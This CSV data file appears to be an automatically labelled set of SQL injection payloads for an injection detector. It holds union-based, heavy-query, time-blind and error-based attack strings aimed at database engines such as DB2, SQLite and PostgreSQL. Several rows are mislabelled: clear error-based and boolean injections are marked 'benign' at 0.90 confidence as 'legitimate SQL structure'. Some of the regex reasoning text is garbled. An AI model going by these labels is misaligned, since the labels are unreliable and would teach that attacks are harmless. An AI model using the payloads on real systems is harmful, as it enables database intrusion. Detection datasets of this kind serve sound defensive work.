id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24544,"1 ) ) as henn where 9980 = 9980 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24545,"1' ) where 3375 = 3375 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24546,"1'|| ( select 'akye' where 9242 = 9242 union all select null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24547,"1"" where 2235 = 2235 union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24548,"1"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""tfso"" = ""tfso",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24549,-6086' ) ) or ( 6719 = 7280 ) *7280 and ( ( 'ozbj' = 'ozbj,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24550,"1 where 2146 = 2146 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24551,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # qmkh",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24552,1%' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24553,"1 ) as kjsd where 1670 = 1670 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24554,"-2987"" ) as iyob where 7827 = 7827 or ( 8459 = 8459 ) *4906--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24555,"-6368 ) ) union all select 4646,4646,4646,4646,4646,4646,4646--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24556,-6947' ) ) as qqjp where 6700 = 6700 union all select 6700#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
